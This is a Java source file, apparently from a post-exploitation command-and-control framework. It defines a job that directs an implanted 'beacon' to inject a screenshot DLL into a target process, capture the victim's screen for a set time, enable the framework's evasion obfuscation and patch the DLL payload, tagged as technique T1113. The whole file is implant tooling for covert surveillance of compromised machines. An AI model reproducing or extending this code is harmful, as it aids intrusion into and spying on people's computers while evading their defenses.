package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class ScreenshotJob extends Job {
    protected int time;

    public ScreenshotJob(TaskBeacon taskBeacon, int n) {
        super(taskBeacon);
        this.time = n * 1000;
    }

    public String getDescription() {
        if (isInject() && this.time > 0) {
            return "Tasked beacon to take screenshots in " + pid + "/" + arch
                    + " for next " + (time / 1000) + " seconds";
        }
        if (isInject()) {
            return "Tasked beacon to take a screenshot in " + pid + "/" + arch;
        }
        if (this.time > 0) {
            return "Tasked beacon to take screenshots for next "
                    + (time / 1000) + " seconds";
        }
        return "Tasked beacon to take screenshot";
    }

    public String getShortDescription() {
        return "take screenshot";
    }

    public String getDLLName() {
        return this.arch.equals("x64") ? "resources/screenshot.x64.dll" : "resources/screenshot.dll";
    }

    public String getPipeName() {
        return "screenshot";
    }

    public int getCallbackType() {
        return 3;
    }

    public int getWaitTime() {
        return 15000;
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }

    public byte[] fix(byte[] arrby) {
        Packer packer = new Packer();
        packer.little();
        packer.addInt(this.time);
        String str = CommonUtils.pad(CommonUtils.bString(packer.getBytes()), Character.MIN_VALUE, 128);
        return CommonUtils.patch(arrby,
                "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR", str);
    }

    public String getTactic() {
        return "T1113";
    }
}
